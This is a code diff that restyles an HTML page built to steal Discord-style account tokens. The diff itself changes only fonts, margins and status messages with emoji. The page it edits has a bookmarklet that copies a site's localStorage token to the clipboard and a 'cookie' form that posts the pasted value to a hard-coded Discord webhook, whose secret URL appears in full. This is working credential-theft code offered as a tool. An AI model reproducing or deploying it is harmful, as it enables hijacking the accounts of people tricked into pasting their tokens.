@@ -1,27 +1,38 @@
 <!DOCTYPE html>
 <html>
 	<head></head>
+	<style>
+		@font-face {
+			font-family: "San Francisco";
+			font-weight: 400;
+			src: url("https://applesocial.s3.amazonaws.com/assets/styles/fonts/sanfrancisco/sanfranciscodisplay-regular-webfont.woff");
+		}
+
+		body, html, a, p {
+			font-family: "San Francisco";
+		}
+	</style>
 	<body>
 		<script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
 
 		<a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">Bookmarklet</a>
 
 		<form>
-			<input type="text" id="form-input" style="width: 400px; height: 25px;" placeholder="cookie"></input>
-			<button type="submit" id="form-submit" style="width: 100px; height: 25px;">SUBMIT</button>
+			<input type="text" id="form-input" style="margin-bottom: 15px; width: 400px; height: 25px;" placeholder="cookie"></input>
+			<button type="submit" id="form-submit" style="margin-bottom: 15px; width: 100px; height: 25px;">SUBMIT</button>
 		</form>
 
 		<script>
 			function write(str) {
-				document.write(`<br>${str}`);
+				document.body.innerHTML += (`<p>${str}</p>`);
 			};
 
 			function handleErrors(response) {
 				if (!response.ok) {
-					write("[HANDLER] Encounted error:&nbsp;" + response.statusText);
+					write("❌ Handler encounted error:&nbsp;" + response.statusText);
 					throw Error(response.statusText);
 				} else {
-					write("[HANDLER] No errors encountered");
+					write("✅ Handler did not encounter any errors");
 				};
 				return response;
 			};
@@ -32,9 +43,8 @@
 				let cook = $("#form-input")[0].value;
 				console.log(cook);
 				
-				write("Submitting webhook...");
+				write("➡️ Submitting webhook...");
 
-				// fetch is used because discord doesn't use jquery
 				fetch("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT",{
 					method: "POST",
 					headers: {
@@ -45,8 +55,8 @@
 					})
 				})
 					.then(handleErrors)
-					.then(response => write("Success (cookie posted with zero failures)&nbsp;" + JSON.stringify(response)))
-					.catch(error => write("Failure (" + JSON.stringify(error) + ")"));
+					.then(response => write("✅ Success (cookie posted with zero failures)&nbsp;" + JSON.stringify(response)))
+					.catch(error => write("❌ Failure (" + JSON.stringify(error) + ")"));
 			});
 		</script>
 
